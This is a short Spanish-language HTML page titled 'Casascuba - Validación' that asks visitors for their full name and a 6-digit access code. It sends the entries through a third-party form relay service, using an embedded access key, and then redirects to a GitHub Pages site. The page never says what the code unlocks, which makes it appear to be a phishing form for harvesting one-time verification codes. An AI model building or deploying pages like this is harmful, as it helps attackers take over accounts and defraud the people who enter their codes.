
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Casascuba - Validación</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; margin: 0; }
        .container { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        h2 { color: #333; }
        .input-group { margin-bottom: 1rem; }
        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .code-inputs { display: flex; justify-content: space-between; margin-bottom: 1.5rem; }
        .code-inputs input { width: 40px; height: 40px; text-align: center; font-size: 1.2rem; border: 1px solid #ccc; border-radius: 4px; }
        .btn-primary { background-color: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1rem; }
        .btn-primary:hover { background-color: #0056b3; }
    </style>
</head>
<body>

<div class="container">
    <h2>Validar Acceso</h2>
    <form action="https://api.web3forms.com/submit" method="POST">
        
        <input type="hidden" name="access_key" value="644a1453-3ad6-45e9-8671-678b7d3d90d4">
        
        <input type="hidden" name="subject" value="Nuevo cliente de Casascuba">
        <input type="hidden" name="from_name" value="Casascuba Web">
        <input type="hidden" name="redirect" value="https://casascubahttp.github.io/Casascuba-/">

        <div class="input-group">
            <input type="text" name="name" placeholder="Nombre completo" required>
        </div>

        <p>Ingrese el código de 6 dígitos:</p>
        <div class="code-inputs">
            <input type="text" name="codigo_1" maxlength="1" required>
            <input type="text" name="codigo_2" maxlength="1" required>
            <input type="text" name="codigo_3" maxlength="1" required>
            <input type="text" name="codigo_4" maxlength="1" required>
            <input type="text" name="codigo_5" maxlength="1" required>
            <input type="text" name="codigo_6" maxlength="1" required>
        </div>

        <button type="submit" class="btn-primary">VALIDAR ACCESO</button>
    </form>
</div>

</body>
</html>
